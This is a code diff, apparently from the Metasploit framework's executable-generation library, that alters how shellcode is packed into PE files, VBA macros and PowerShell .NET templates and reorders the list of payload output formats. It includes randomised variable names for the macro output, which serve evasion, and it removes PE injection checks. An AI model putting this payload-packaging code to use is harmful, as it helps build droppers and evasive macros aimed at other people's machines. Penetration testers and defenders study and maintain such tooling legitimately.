@@ -169,21 +169,11 @@ require 'msf/core/exe/segment_injector'
     payload = win32_rwx_exec(code)
 
     # Create a new PE object and run through sanity checks
-    endjunk = true
     fsize = File.size(opts[:template])
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
     text = nil
-    sections_end = 0
     pe.sections.each do |sec|
       text = sec if sec.name == ".text"
-      sections_end = sec.size + sec.file_offset if sec.file_offset >= sections_end
-      endjunk = false if sec.contains_file_offset?(fsize-1)
-    end
-    #also check to see if there is a certificate
-    cert_entry = pe.hdr.opt['DataDirectory'][4]
-    #if the cert is the only thing past the sections, we can handle.
-    if cert_entry.v['VirtualAddress'] + cert_entry.v['Size'] >= fsize and sections_end >= cert_entry.v['VirtualAddress']
-      endjunk = false
     end
 
     #try to inject code into executable by adding a section without affecting executable behavior
@@ -824,8 +814,8 @@ def self.to_vba(framework,code,opts={})
     persist = opts[:persist] || false
 
     hash_sub = {}
-    hash_sub[:var_shellcode] = ""
-    hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+    hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:exe_filename] = Rex::Text.rand_text_alpha(rand(8)+8) << '.exe'
     hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -835,7 +825,7 @@ def self.to_vba(framework,code,opts={})
     hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
 
-    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
+    hash_sub[:hex_shellcode] = exes.unpack('H*').join('')
 
     hash_sub[:init] = ""
 
@@ -910,7 +900,7 @@ def self.to_vba(framework,code,opts={})
     hash_sub[:var_compileParams] 	= Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
 
-    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
+    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
 
     return read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
@@ -1729,8 +1719,25 @@ def self.to_vba(framework,code,opts={})
 
   def self.to_executable_fmt_formats
     [
-      'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-      'vbs','loop-vbs','asp','aspx', 'aspx-exe','war','psh','psh-net', 'msi', 'msi-nouac'
+      "asp",
+      "aspx",
+      "aspx-exe",
+      "dll",
+      "elf",
+      "exe",
+      "exe-only",
+      "exe-service",
+      "exe-small",
+      "loop-vbs",
+      "macho",
+      "msi",
+      "msi-nouac",
+      "psh",
+      "psh-net",
+      "vba",
+      "vba-exe",
+      "vbs",
+      "war"
     ]
   end
 
@@ -1757,4 +1764,3 @@ def self.to_vba(framework,code,opts={})
 end
 end
 end
-
